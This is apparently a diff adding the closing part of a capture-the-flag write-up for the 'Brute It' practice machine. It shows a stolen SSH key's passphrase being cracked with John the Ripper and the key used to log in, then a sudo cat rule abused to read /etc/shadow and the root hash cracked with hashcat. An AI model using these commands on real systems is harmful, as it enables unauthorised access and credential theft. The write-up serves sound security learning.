@@ -93,3 +93,71 @@ We got the password and We are in to the admin dashboard.
 
 <img src="https://user-images.githubusercontent.com/67650329/217141154-4bb95800-9762-4daa-b71a-08cfac88bca3.png" width="450px" align="center">
 
+We can see on admin dashboard have RSA Private Key.
+
+We can download it and crack, use John The Ripper tools.
+```
+/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+john --wordlist=/home/kali/Downloads/rockyou.txt id_rsa.hash
+Press 'q' or Ctrl-C to abort, almost any other key for status
+r***l     (id_rsa)
+```
+BOOM!!!. We got the password.
+
+We can try login into the ssh.
+
+`ssh -i id_rsa john@[TARGET]`
+```
+john@bruteit:~$ ls
+user.txt
+john@bruteit:~$ cat user.txt
+THM{***}
+```
+After we get in we got the user.
+
+And after that we can try use command `sudo -l`
+```
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+```
+We got the directory to exploit `/bin/cat`
+
+We can use [gtfobinds](https://gtfobins.github.io/gtfobins/cat/) to exploit the directory.
+```
+john@bruteit:/$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+…
+…
+```
+We got the root hash on `/etc/shadow`
+
+Now we must crack the password using hashcat.
+
+`hashcat -m 1800 text.txt rockyou.txt`
+
+```
+…
+…
+$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:f***l
+…
+…
+```
+We got the root password.
+
+And we can try login it.
+```
+john@bruteit:~$ su root
+Password: 
+root@bruteit:/home/john# cat /root/root.txt
+```
+We got the root :)
+
+Thank you for reading 👋.
+
+---
